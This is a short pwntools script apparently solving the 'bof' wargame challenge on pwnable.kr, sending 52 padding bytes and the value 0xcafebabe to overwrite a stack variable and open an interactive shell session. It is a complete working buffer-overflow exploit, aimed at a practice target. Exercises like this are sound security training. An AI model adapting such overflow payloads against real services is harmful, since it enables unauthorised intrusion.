# solved.py
from pwn import *
 
p = remote('pwnable.kr', 9000)

send = b'a'*52
send += p32(0xcafebabe)

p.send(send)
p.interactive()
